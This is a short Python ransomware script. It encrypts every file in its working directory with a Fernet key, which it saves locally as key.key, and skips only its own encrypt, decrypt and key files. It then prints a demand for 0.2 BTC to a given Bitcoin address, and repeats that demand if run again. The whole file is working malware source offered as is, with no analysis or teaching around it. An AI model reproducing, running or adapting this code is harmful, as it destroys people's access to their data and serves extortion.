import os
from cryptography.fernet import Fernet

files = []

if ("key.key" in os.listdir()):
    print("your files are already encrypted. \npay a ransom of 0.2 BTC to this address to unlock your files: 1HKQfGKXA3A5Wxibvzzrnk72fFZ252pTvF")
    exit()
    
for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "key.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("key.key", "wb") as theKey:
    theKey.write(key)

for file in files:
    with open(file, "rb") as theFile:
        contents = theFile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as theFile:
        theFile.write(contents_encrypted)

print("your files have been encrypted. \npay a ransom of 0.2 BTC to this address to unlock your files: 1HKQfGKXA3A5Wxibvzzrnk72fFZ252pTvF")
print("number of files encrypted: ", len(files));
